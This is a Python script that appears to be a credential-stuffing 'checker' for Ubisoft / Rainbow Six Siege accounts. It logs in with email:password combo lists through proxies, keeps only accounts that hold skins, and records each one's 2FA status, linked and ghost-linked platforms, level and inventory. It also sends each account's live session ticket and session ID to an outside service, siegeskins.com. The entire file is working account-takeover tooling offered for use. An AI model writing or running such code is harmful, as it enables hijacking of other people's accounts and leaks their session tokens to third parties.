import json
import httpx
from base64 import b64encode

config = json.load(open('config.json'))

async def get_account_token(email, password):
    raw = f"{email}:{password}".encode()
    return b64encode(raw).decode()

async def format_proxy(proxy):
    try:
        p_username, p_password, p_hostname, p_port = proxy.split(":")
        _proxy = f"http://{p_username}:{p_password}@{p_hostname}:{p_port}"
        return _proxy
    except ValueError:
        raise ValueError("Wrong proxy format. Format should be: user:password:ip:port")

async def getAccountDetails(combo):
    try:
        if ":" in combo:
            user, password = combo.split(":")
        else:
            return {'success': False, 'error': 'Wrong combo, missing ":"'}
    except ValueError:
        return {'success': False, 'error': 'Failed to split combo. Missing ":"?'}
    max_retries = 5
    retries = 0

    while retries < max_retries:
        try:

            async with httpx.AsyncClient(timeout=8) as session:
                token = await get_account_token(user, password)
                headers_1 = {
                    'Authorization': f'Basic {token}',
                    'Ubi-AppId': 'e3d5ea9e-50bd-43b7-88bf-39794f4e3d40',
                    'Ubi-RequestedPlatformType': 'uplay',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Massgate'
                }
                res0 = await session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions", headers=headers_1, json={'rememberMe': True})
                if res0.status_code != 200:
                    return {'success': False, 'error': 'Failed to make request to ubiservices.'}

                src = res0.json()
                ubi_username = src.get("nameOnPlatform")
                ubi_ticket = src.get("ticket")
                ubi_sessionid = src.get("sessionId")
                ubi_userid = src.get("userId")

                headers_2 = {
                    'Authorization': f'ubi_v1 t={ubi_ticket}',
                    'Ubi-AppId': '314d4fef-e568-454a-ae06-43e3bece12a6',
                    'Ubi-SessionId': 'uplay',
                    'Ubi-LocaleCode': 'en-US',
                    'User-Agent': 'Massgate'
                }
                res1 = await session.get(f"https://public-ubiservices.ubi.com/v1/profiles/{ubi_userid}/inventory?spaceId=0d2ae42d-4c27-4cb7-af6c-2099062302bb", headers=headers_2)
                if res1.status_code != 200:
                    return {'success': False, 'error': 'Failed to check for skins.'}

                src2 = res1.json()
                does_have_skins = True if len(src2.get("items")) >= 1 else False

                if does_have_skins:
                    skins_amount = str(len(src2.get("items")))
                    is_2fa_mfa = 'Yes' if (await session.get("https://public-ubiservices.ubi.com/v3/profiles/me/2fa", headers=headers_2)).json().get("active") else 'No'

                    profile_plat = (await session.get("https://public-ubiservices.ubi.com/v3/users/me/profiles", headers=headers_2)).json()
                    profile_platform_types = {p['platformType'] for p in profile_plat['profiles']}
                    initialprofile_plat = (await session.get("https://public-ubiservices.ubi.com/v3/users/me/initialProfiles", headers=headers_2)).json()
                    initial_platform_types = {p['platformType'] for p in initialprofile_plat['profiles']}
                    ghost_linked = list(initial_platform_types - profile_platform_types)

                    headers_3 = {
                        'Authorization': f'ubi_v1 t={ubi_ticket}',
                        'Ubi-AppId': '314d4fef-e568-454a-ae06-43e3bece12a6',
                        'Ubi-SessionId': ubi_sessionid,
                        'Ubi-LocaleCode': 'en-US',
                        'User-Agent': 'Massgate'
                    }
                    ubi_level = (await session.get(f"https://public-ubiservices.ubi.com/v1/spaces/0d2ae42d-4c27-4cb7-af6c-2099062302bb/title/r6s/rewards/public_profile?profile_id={ubi_userid}", headers=headers_3)).json()
                    ubi_levels = ubi_level.get('level', 0)
                    ubi_xp = ubi_level.get('xp', 0)

                    siegeskins_success = False
                    info_siege = {
                        'currency': {'renown': 0, 'credits': 0},
                        'inventory': {'Seasonals': []},
                        'banned': False
                    }
                    for _ in range(3):
                        try:
                            res3 = await session.post(
                                "https://siegeskins.com/api/add",
                                headers={
                                    'Authorization': config['siegeskins-api-key'],
                                    'Content-Type': 'application/json',
                                    'User-Agent': 'Massgate'
                                },
                                json={"ticket": ubi_ticket, "session_id": ubi_sessionid},
                                follow_redirects=True
                            )
                            info_siege = res3.json()
                            if info_siege.get('username'):
                                siegeskins_success = True
                                break
                        except httpx.RequestError:
                            continue
                    
                    transformed_inventory = {category: len(items) for category, items in info_siege.get("inventory").items()}
                    return {
                        'success': True,
                        'error': None,
                        'information': {
                            'username': ubi_username,
                            'level': ubi_levels,
                            'xp': ubi_xp,
                            'linked_platforms': list(profile_platform_types),
                            'ghost_linked': ghost_linked,
                            '2fa-mfa': is_2fa_mfa,
                            'currency-renown': info_siege['currency']['renown'],
                            'currency-credits': info_siege['currency']['credits'],
                            'banned': "Yes" if info_siege.get("banned") else "No",
                            'amount_of_skins': str(skins_amount),
                            'siegeskinssiteurl': f'https://siegeskins.com/profile/{ubi_userid}',
                            'inventory': transformed_inventory,
                            'note': None if siegeskins_success else "There might've been an error while retrieving information."
                        }
                    }
                else:
                    return {'success': False, 'error': 'Not enough skins.'}
        except Exception as e:
            retries += 1
            print(e)
            if retries == max_retries:
                return {'success': False, 'error': str(e)}

    return {'success': False, 'error': 'Max retries reached.'}

